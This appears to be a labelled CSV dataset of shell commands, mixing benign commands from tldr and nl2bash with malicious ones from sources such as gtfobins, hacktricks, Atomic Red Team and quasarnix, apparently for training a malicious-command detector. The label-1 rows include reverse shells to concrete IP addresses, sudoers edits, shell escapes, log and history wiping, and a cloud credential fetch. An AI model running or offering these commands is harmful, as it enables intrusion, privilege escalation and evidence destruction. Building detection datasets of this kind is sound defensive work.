id,command,label,source,split
d1_000464,sudo apt install -y golang-go gcc debootstrap rsync gpg squashfs-tools git make build-essential libwin-hivex-perl wimtools genisoimage,1,hacktricks,train
d1_000465,boot repl,0,tldr,train
d1_000466,qrcp send|receive [-i|--interface] interface,0,tldr,train
d1_000467,gotty [-w|--permit-write] shell,0,tldr,train
d1_000468,sed -i 's/https/GET/g' users.ini,0,bash_instruct,train
d1_000469,cp -u metrics.tmp vendor/,0,bash_instruct,train
d1_000470,"echo 'chmod 777 /etc/sudoers && echo ""www-data ALL=NOPASSWD:ALL"" >> /etc/sudoers && chmod 440 /etc/sudoers' > /tmp/update",1,hacktricks,train
d1_000471,virsh -c qemu:///system pool-create-as x dir --target /path/to/dir/,1,gtfobins,train
d1_000472,find ./test -type d -name '[0-9][0-9][0-9][0-9][0-9]',0,nl2bash,train
d1_000473,mv settings.old scripts/,0,bash_instruct,train
d1_000475,sshpass -p 'pwd101!' ssh testuser1@localhost -T hostname,1,atomic_red_team,train
d1_000476,cp config.gz config.gz.bak,0,bash_instruct,train
d1_000477,while(pe.available()>0)so.write(pe.read());,1,gtfobins,train
d1_000478,xxd -l 64 test.txt,0,bash_instruct,train
d1_000479,look '' /path/to/input-file,1,gtfobins,train
d1_000480,pkgctl version,0,tldr,train
d1_000481,"basedir=$(dirname ""$(echo ""$0"" | sed -e 's,\\,/,g')"")",0,nl2bash,train
d1_000482,python -m pip install package,0,tldr,train
d1_000483,find /etc/ -maxdepth 1 -name *.conf -type f -exec ls -la {} \; 2>/dev/null,1,slp,train
d1_000484,ss -tn dst db02.internal,0,bash_instruct,train
d1_000485,/bin/bash -i 3<> /dev/udp/139.189.55.208/22 0<&3 1>&3 2>&3,1,quasarnix,train
d1_000486,sudo pacman -S strongswan charon-systemd,0,linlm,train
d1_000487,0<&3;exec 3<>/dev/tcp/50.183.112.191/52534; /bin/bash <&3 >&3 2>&3,1,quasarnix,train
d1_000488,dialog --textbox /path/to/input-file 0 0,1,gtfobins,train
d1_000489,if [ -d /Library/Preferences/ ]; then ls -la /Library/Preferences/ > /tmp/T1083.txt; fi;,1,atomic_red_team,train
d1_000490,"cargo [c|check] [-F|--features] feature1,feature2",0,tldr,train
d1_000491,sudo useradd -m -d /home/devuser devuser,0,bash6k,train
d1_000492,exec 3<>/dev/udp/76.132.177.92/56319;cat <&3 | while read zgl3; do $zgl3 2>&3 >&3; done,1,quasarnix,train
d1_000493,"git commit [-m|--message] ""message"" [-m|--message] ""description""",0,tldr,train
d1_000494,tar -xzf backup.tar.gz -C docs,0,bash_instruct,train
d1_000495,journalctl -u mongod -f,0,bash_instruct,train
d1_000496,"find $HOME -name "".*"" -ls",0,nl2bash,train
d1_000497,neo4j stop,0,linlm,train
d1_000499,mkdir ${CGROUP_MOUNT}/${CGROUP_NAME},1,hacktricks,train
d1_000500,vt analysis file_id|analysis_id,0,tldr,train
d1_000501,filen download remote_id path/to/local_destination,0,tldr,train
d1_000502,cat auth.txt | wc -l,0,bash_instruct,train
d1_000503,cp config.tmp config.tmp.bak,0,bash_instruct,train
d1_000504,du -h project/* | sort -rh | head -n 10,0,bash_instruct,train
d1_000505,fzf --listen=12345,1,gtfobins,train
d1_000506,"head -1 table | tr -s ' ' '\n' | nl -nln | grep ""Target"" | cut -f1",0,nl2bash,train
d1_000507,ping -c 1 84.166.54.191 | awk 'FNR == 2 { print $(NF-1) }',0,nl2bash,train
d1_000508,"Disk /dev/sda: 4 GiB, 4294967296 bytes, 8388608 sectors",1,hacktricks,train
d1_000509,"ls -1 | tr '\n' ',' | sed 's/,$/\n/'",0,nl2bash,train
d1_000511,sudo sed -i 's/;bind_address = 76.132.177.92/bind_address = 76.132.177.92/' /etc/couchdb/local.ini,0,linlm,train
d1_000513,jj diffedit --restore-descendants,0,tldr,train
d1_000514,virt-viewer [-c|--connect] uri domain,0,tldr,train
d1_000515,poetry debug resolve,0,tldr,train
d1_000516,echo 0 > /proc/sys/vm/dirty_writeback_centisecs,1,hacktricks,train
d1_000517,rustup override set toolchain,0,tldr,train
d1_000518,rpicam-jpeg [-o|--output] path/to/file.jpg --shutter 20000 --gain 1.5,0,tldr,train
d1_000519,openai api models.list,0,tldr,train
d1_000520,pyright --outputjson /path/to/input-file,1,gtfobins,train
d1_000521,wc README.md,0,bash6k,train
d1_000522,zinit self-update,0,tldr,train
d1_000524,"sudo /usr/bin/ruby -e 'exec ""/bin/sh""'",1,hacktricks,train
d1_000525,"find . -name ""*.c"" | xargs -n3 echo",0,nl2bash,train
d1_000526,tar -czf - project | ssh admin@git.example.com 'cat > /backup/project.tar.gz',0,bash_instruct,train
d1_000527,cp /bin/sh /tmp/crond;,1,atomic_red_team,train
d1_000528,tldr while,0,tldr,train
d1_000529,find -name filename,0,nl2bash,train
d1_000530,cp -p account.html migrations/,0,bash_instruct,train
d1_000531,"sed -n '10,20p' archive.csv",0,bash_instruct,train
d1_000532,sudo pacman -Sw package_name,0,linlm,train
d1_000534,nitch [-v|--version],0,tldr,train
d1_000535,emacsclient [-nw|--no-window-system] path/to/file,0,tldr,train
d1_000537,tr '\0' ' ' < /proc/$p/cmdline 2>/dev/null; echo,1,hacktricks,train
d1_000538,ln -s archive.csv latest.log,0,bash_instruct,train
d1_000539,goaccess path/to/logfile [-o|--output] path/to/file.html --real-time-html,0,tldr,train
d1_000540,"pkill -USR1 ""process_name""",0,tldr,train
d1_000541,"find . -name ""*.java"" -exec grep -Hin TODO {} + | cut -d "":"" -f 1",0,nl2bash,train
d1_000542,wacli messages show message_id --json,0,tldr,train
d1_000543,poweroff [-w|--wtmp-only],0,tldr,train
d1_000544,"cat access.csv | awk '{ print length, $0 }' | sort -rn | head -20 | cut -d' ' -f2-",0,bash_instruct,train
d1_000545,find / -perm +u=s,0,nl2bash,train
d1_000546,"mailx < content.txt [-s|--subject] ""subject"" to_addr",0,tldr,train
d1_000547,mv *.json lib/,0,bash_instruct,train
d1_000548,"sed 's/\t/,/g' audit.txt > audit.txt.csv",0,bash_instruct,train
d1_000550,docker run --name influxdb2 -p 8086:8086 -d influxdb:2.0,0,linlm,train
d1_000551,grep -rl 'TODO' lib,0,bash_instruct,train
d1_000552,xz -9 -k largefile.bin,0,bash6k,train
d1_000553,namcap path/to/pkgbuild,0,tldr,train
d1_000554,tts --model_info_by_idx model_type/model_query_idx,0,tldr,train
d1_000555,umask,0,bash6k,train
d1_000556,stat -c '%a' report.tar.gz,0,bash_instruct,train
d1_000557,journalctl -u service_name,0,linlm,train
d1_000558,find . -mtime +1,0,bash6k,train
d1_000560,sudo pacman -S st,0,linlm,train
d1_000561,wc -w schema.sql,0,bash_instruct,train
d1_000562,[ -f migration.js ] && cat migration.js || echo 'not found',0,bash_instruct,train
d1_000563,sed -i '/^\s*PermitRootLogin/ s/^/#/' /etc/ssh/sshd_config && echo 'PermitRootLogin no' >> /etc/ssh/sshd_config,0,bash6k,train
d1_000564,redcarpet /path/to/input-file,1,gtfobins,train
d1_000566,i2cget -y i2cbus device_address register_address,0,tldr,train
d1_000567,chmod +x /dev/shm/terraform-provider-examples,1,hacktricks,train
d1_000568,git instaweb --start [-l|--local],0,tldr,train
d1_000569,hping3 [-V|--verbose] [-S|--syn] [-p|--destport] 80 [-s|--baseport] 5090 ip_or_hostname,0,tldr,train
d1_000570,tar -czf - static | ssh nginx@app01.service.io 'cat > /backup/static.tar.gz',0,bash_instruct,train
d1_000571,stat product.sql,0,bash_instruct,train
d1_000572,find /home -type f -exec du -h {} + | sort -rh | head -n 10,0,bash6k,train
d1_000573,size=`cat script.sh | wc -c`,0,nl2bash,train
d1_000574,cp response.jpg reports/,0,bash_instruct,train
d1_000575,find /home/tecmint/Downloads/ -type f -exec du -Sh {} + | sort -rh | head -n 5,0,nl2bash,train
d1_000576,diff -rq dir1 dir2 | grep 'Only in dir1/',0,nl2bash,train
d1_000577,rm ~/.bash_history,1,atomic_red_team,train
d1_000578,nc -cu /bin/sh 77.195.83.6 58951,1,quasarnix,train
d1_000580,find $workspace_ts -mindepth 1 -maxdepth 1 -type d -mtime -30,0,nl2bash,train
d1_000582,cat users.txt | tail -n 15,0,bash_instruct,train
d1_000583,cp -u product.txt backup/,0,bash_instruct,train
d1_000584,find uploads -type f -name '*.bak' -print0 | xargs -0 rm -f,0,bash_instruct,train
d1_000585,paste /path/to/input-file,1,gtfobins,train
d1_000586,"busctl set-property org.freedesktop.systemd1 /org/freedesktop/systemd1 org.freedesktop.systemd1.Manager LogLevel s debug --address=unixexec:path=/bin/sh,argv1=-pc,argv2='/bin/sh -p -i 0<&2 1>&2'",1,gtfobins,train
d1_000587,"medusa -M HTTP -h host -u username -p password -m USER-AGENT:""Agent""",0,tldr,train
d1_000588,nc -e /usr/bin/dash 197.87.146.2 80,1,quasarnix,train
d1_000589,bootc upgrade --check,0,tldr,train
d1_000590,idevicediagnostics diagnostics,0,tldr,train
d1_000591,X=$'cat\x20/etc/passwd'&&$X,1,hacktricks,train
d1_000594,stat -c 'dev=%d inode=%i links=%h mode=%A owner=%U:%G path=%n' /path/a /path/b,1,hacktricks,train
d1_000595,head -n 1 order.html,0,bash_instruct,train
d1_000596,"sed 's/\t/,/g' debug.yaml > debug.yaml.csv",0,bash_instruct,train
d1_000597,lxc-create [-?|--help],0,tldr,train
d1_000598,deactivate,0,bash6k,train
d1_000599,ar r /path/to/output-file /path/to/input-file,1,gtfobins,train
d1_000600,sudo chown -R ubuntu:users config,0,bash_instruct,train
d1_000601,kubectl events [-A|--all-namespaces],0,tldr,train
d1_000602,rlwrap [-p|--prompt-colour=]black|red|green|yellow|blue|cyan|purple|white|colour_spec command,0,tldr,train
d1_000603,sync path/to/file,0,tldr,train
d1_000605,env -i perl -V,0,nl2bash,train
d1_000606,poetry cache clear PyPI --all,0,tldr,train
d1_000608,find include -name '*.cache' -print0 | xargs -0 grep -l TODO,0,bash_instruct,train
d1_000609,find /host/var/lib -maxdepth 3 \( -name docker -o -name containers -o -name containerd \) 2>/dev/null,1,hacktricks,train
d1_000610,cargo fetch --target target_triple,0,tldr,train
d1_000611,sudo ./easyrsa gen-req server nopass,0,linlm,train
d1_000612,locate -r '\.nse$' | xargs grep categories | grep 'default\|version\|safe' | grep smb,1,hacktricks,train
d1_000613,head -n 1 payload.sh,0,bash_instruct,train
d1_000614,tr '\0' '\n' < /proc/$(pgrep -o -f logstash)/environ 2>/dev/null | sort,1,hacktricks,train
d1_000615,pip install alembic,0,linlm,train
d1_000616,find . -type f -printf '%f ' -exec openssl dgst -md5 {} \;,0,nl2bash,train
d1_000618,history -w /path/to/output-file,1,gtfobins,train
d1_000620,mixxx --developer --safeMode,0,tldr,train
d1_000621,cat /path/to/input-file,1,gtfobins,train
d1_000622,gpgconf --reload component,0,tldr,train
d1_000623,find -print0 | xargs -0 ls,0,nl2bash,train
d1_000624,pdflatex '\documentclass{article}\newwrite\tempfile\begin{document}\immediate\openout\tempfile=output-file.tex\immediate\write\tempfile{DATA}\immediate\closeout\tempfile\end{document}',1,gtfobins,train
d1_000625,cp -u audit.zip build/,0,bash_instruct,train
d1_000626,udiskie-umount path/to/mount,0,tldr,train
d1_000627,zm new,0,tldr,train
d1_000628,cat product.yaml | sed 's/[[:space:]]*$//',0,bash_instruct,train
d1_000629,mv error.txt assets/,0,bash_instruct,train
d1_000630,"octez-client originate contract alias transferring 0 from alias|address running path/to/source_file.tz --init ""initial_storage"" --burn_cap 1",0,tldr,train
d1_000635,sed -i 's/enabled/success/g' server.yaml,0,bash_instruct,train
d1_000636,gzip -k gc.log,0,bash_instruct,train
d1_000637,mv -n export.pdf export.pdf.old,0,bash_instruct,train
d1_000639,find /data -type f -size +100M -print0 | xargs -0 -n1 -P4 sha256sum | sort -k2 > checksums.txt,0,bash6k,train
d1_000640,chmod 644 product.xml,0,bash_instruct,train
d1_000641,zip -r releases.zip releases,0,bash_instruct,train
d1_000643,scp www-data@backup.corp.net:/var/log/cron.log .,0,bash_instruct,train
d1_000644,sudo systemctl restart memcached,0,bash_instruct,train
d1_000647,xxd -l 64 notes.old,0,bash_instruct,train
d1_000648,"tlmgr search --all --word ""regex""",0,tldr,train
d1_000649,nmcli device wifi connect MyWifi password MyPass,0,linlm,train
d1_000650,readelf -d /path/to/suid-binary 2>/dev/null | egrep 'RPATH|RUNPATH',1,hacktricks,train
d1_000651,[ -f error.jpg ] && cat error.jpg || echo 'not found',0,bash_instruct,train
d1_000653,cowsay -f /path/to/script.pl x,1,gtfobins,train
d1_000654,rgb3toppm path/to/red_file.ppm path/to/green_file.ppm path/to/blue_file.ppm > path/to/output.ppm,0,tldr,train
d1_000655,virsh connect qemu:///system,0,tldr,train
d1_000657,gradle properties [-i|--info],0,tldr,train
d1_000658,"echo 'execute = /bin/sh,-c,""/bin/sh </dev/tty >/dev/tty 2>/dev/tty""' >~/.rtorrent.rc",1,gtfobins,train
d1_000661,wc -l payload.sh,0,bash_instruct,train
d1_000662,cat /dev/zero > /var/log/messages #log file filled with null bytes(zeros),1,atomic_red_team,train
d1_000663,AUTOM4TE=/path/to/temp-file autoconf,1,gtfobins,train
d1_000665,crontab -l | grep 'word',0,nl2bash,train
d1_000666,"t:connect(""attacker.com"",12345);",1,gtfobins,train
d1_000667,gummy [-b|--brightness] +10,0,tldr,train
d1_000668,tlmgr repository list path|url|tag,0,tldr,train
d1_000669,curl http://hdedf5e56.example.net/path/to/input-file -o /path/to/output-file,1,gtfobins,train
d1_000670,printf '%s\n' '#!/bin/bash' | sudo tee /etc/rc.common,1,atomic_red_team,train
d1_000671,path/to/PalServer.sh,0,tldr,train
d1_000672,DumpNTLMInfo.py target,0,tldr,train
d1_000673,chmod +x changelog.sh,0,bash_instruct,train
d1_000674,[ -f transaction.jpg ] && cat transaction.jpg || echo 'not found',0,bash_instruct,train
d1_000675,launchctl start script_file,0,tldr,train
d1_000676,cat <<'EOF' > /tmp/modprobe-payload,1,hacktricks,train
d1_000677,nl index.json,0,bash_instruct,train
d1_000678,webstorm path/to/directory,0,tldr,train
d1_000679,fping [-q|--quiet] [-a|--alive] [-g|--generate] 145.170.68.118 221.91.248.109,0,tldr,train
d1_000680,"echo '{""scripts"": {""preinstall"": ""/bin/sh""}}' >package.json",1,gtfobins,train
d1_000684,wait ls,0,bash6k,train
d1_000685,find /var/lib /run /var/run -maxdepth 3 -type f 2>/dev/null | head -n 100,1,hacktricks,train
d1_000686,cat backup.md | grep -v '^$',0,bash_instruct,train
d1_000687,filename='/etc/rc.local';if [ ! -f $filename ];then sudo touch $filename;else sudo cp $filename /etc/rc.local.original;fi,1,atomic_red_team,train
d1_000688,yay -S concourse,0,linlm,train
d1_000689,grep -oE '(INFO|WARN|ERROR|DEBUG)' worker.log | sort | uniq -c | sort -nr,0,bash_instruct,train
d1_000690,sudo nmap -sSV -oA OUTPUTFILE -T4 -iL INPUTFILE.csv,1,payloads,train
d1_000691,xml [el|elements] path/to/input.xml|uri > path/to/elements.xpath,0,tldr,train
d1_000692,sudo pacman -S ksh,0,linlm,train
d1_000696,cat transaction.json | grep -v '^$',0,bash_instruct,train
d1_000697,tldr nm,0,tldr,train
d1_000699,find reports -type f -print0 | xargs -0 chmod 644,0,bash_instruct,train
d1_000700,cat audit.ini | sort -u,0,bash_instruct,train
d1_000701,cat credentials.conf | tail -n 15,0,bash_instruct,train
d1_000702,kiterunner scan https://h0caaf24a.example.net [-w|--kitebuilder-list] path/to/wordlist.kite [-x|--max-connection-per-host] 5 [-j|--max-parallel-hosts] 100,0,tldr,train
d1_000703,awk '{print $9}' customers.tsv | sort | uniq -c | sort -nr | head -n 25,0,bash_instruct,train
d1_000704,shards init,0,tldr,train
d1_000705,podman top -l label,1,hacktricks,train
d1_000707,grep -c 'overflow' dmesg.log,0,bash_instruct,train
d1_000708,cat access.log | wc -l,0,bash_instruct,train
d1_000709,diff path/to/file1 path/to/file2 | diffstat,0,tldr,train
d1_000710,pgrep -c nginx,0,bash_instruct,train
d1_000711,tlmgr update --list,0,tldr,train
d1_000712,podman rmi image_name,0,linlm,train
d1_000713,iptables -P FORWARD ACCEPT,1,hacktricks,train
d1_000714,file sales.json,0,bash_instruct,train
d1_000715,find . -type f -print0,0,nl2bash,train
d1_000716,bootc rollback,0,tldr,train
d1_000719,masscan 7.98.246.159/0 [-p|--ports] 0-65535 --output-format binary|grepable|json|list|xml --output-filename path/to/file,0,tldr,train
d1_000721,sdiff [-o|--output] path/to/merged_file path/to/file1 path/to/file2,0,tldr,train
d1_000723,eza [-r|--reverse] [-s|--sort] size,0,tldr,train
d1_000724,AUTOM4TE=/path/to/temp-file autoheader,1,gtfobins,train
d1_000725,echo 0> /var/log/secure,1,atomic_red_team,train
d1_000727,chmod 744 manifest.xml,0,bash_instruct,train
d1_000729,moshe pts/1 194.16.208.203 02:53 24:07 0.06s 0.06s /bin/bash,1,hacktricks,train
d1_000730,kubectl run atomic-insecure-curl --image=curlimages/curl --restart=Never --rm -it -- curl -ksL https://h78a3be1d.example.net,1,atomic_red_team,train
d1_000732,cp -u build.old static/,0,bash_instruct,train
d1_000733,sort -k2 -n credentials.json,0,bash_instruct,train
d1_000734,dotty path/to/graph.gv,0,tldr,train
d1_000736,apptainer run path/to/image.sif arg1 arg2 ...,0,tldr,train
d1_000738,fpath=(path/to/functions_dir $fpath) && autoload -Uz function_name,0,tldr,train
d1_000739,pueue stash task_id,0,tldr,train
d1_000740,strings temp-file.dvi,1,gtfobins,train
d1_000744,codespell,0,tldr,train
d1_000745,head -n 20 users.pdf,0,bash_instruct,train
d1_000746,rcat 185.102.79.239 1828 -r /bin/bash,1,quasarnix,train
d1_000747,"curl -s --connect-timeout 2 -m 5 -H ""X-aws-ec2-metadata-token: $token"" ""http://h8a13b895.example.net/latest/meta-data/iam/security-credentials/$role"" -o ""/tmp/T1552.005_aws_imds_creds.json""",1,atomic_red_team,train
d1_000748,"find /usr/local/apache/logs/ -type f -name ""*_log""|xargs du -csh",0,nl2bash,train
d1_000749,usermod --unlock art,1,atomic_red_team,train
d1_000750,mv *.csv assets/,0,bash_instruct,train
d1_000751,wc -c config.old,0,bash_instruct,train
d1_000753,"echo ""[Unit]"" > /etc/systemd/system/atomic-modify-test.service",1,atomic_red_team,train
d1_000754,glab repo fork owner/repository [-c|--clone],0,tldr,train
d1_000755,du -h /var/www/* 2>/dev/null | sort -rh | head -n 10,0,bash_instruct,train
d1_000756,diff -q <(sort set1 | uniq) <(sort set2 | uniq),0,nl2bash,train
d1_000757,ganache-cli --secure,0,tldr,train
d1_000758,find . -iname .svn -exec bash -c 'rm -rf {}' \;,0,nl2bash,train
d1_000760,uwsgi --reload /tmp/uwsgi.pid,0,linlm,train
d1_000761,"echo """" > ~/.bash_history",1,atomic_red_team,train
d1_000762,pct [se|set] 100 --onboot,0,tldr,train
d1_000763,split -n 100000 /usr/bin/gcc,0,nl2bash,train
d1_000764,yay -S seafile,0,linlm,train
d1_000766,sudo pacman -S tree,0,bash_instruct,train
d1_000767,find . -newer first -not -newer last -type d -print0 | xargs -0 rmdir,0,nl2bash,train
d1_000768,cat config.md | wc -l,0,bash_instruct,train
d1_000769,ibmcloud ks cluster get [-c|--cluster] cluster_id,0,tldr,train
d1_000770,ssh -p 8000 mysql@proxy.local,0,bash_instruct,train
d1_000771,nl schema.bak,0,bash_instruct,train
d1_000772,[ -f migration.py ] && cat migration.py || echo 'not found',0,bash_instruct,train
d1_000777,sudo lvremove volume_group,0,tldr,train
d1_000778,for d in `find /var /etc /home /root /tmp /usr /opt /boot /sys -type d -user $(whoami) 2>/dev/null`; do find $d ! -user `whoami` -exec ls -l {} \; 2>/dev/null; done,1,hacktricks,train
d1_000780,"echo -n teststring | gzip -1 | tail -c 8 | head -c 4 | hexdump -e '1/4 ""%08x"" ""\n""'",0,nl2bash,train
d1_000781,tar -czf - include | ssh tomcat@monitor.service.io 'cat > /backup/include.tar.gz',0,bash_instruct,train
d1_000782,sudo pacman -U /var/cache/pacman/pkg/firefox-115.0-1-x86_64.pkg.tar.zst,0,linlm,train
d1_000783,"find -name ""*.js"" -not -path ""./directory/*""",0,nl2bash,train
d1_000784,crane rebase,0,tldr,train
d1_000785,gpgconf --list-components,0,tldr,train
d1_000786,pulumi version,0,tldr,train
d1_000787,seq 10 | xargs,0,nl2bash,train
d1_000788,vault init,0,tldr,train
d1_000789,cat payment.csv | tr ' ' '\n' | sort | uniq -c | sort -nr | head -n 5,0,bash_instruct,train
d1_000790,expand,0,tldr,train
d1_000791,cat payment.json | tr ' ' '\n' | sort | uniq -c | sort -nr | head -n 5,0,bash_instruct,train
d1_000792,sudo tcpdump -n -i lo -G1 -w /dev/null -z ./runme.sh,1,hacktricks,train
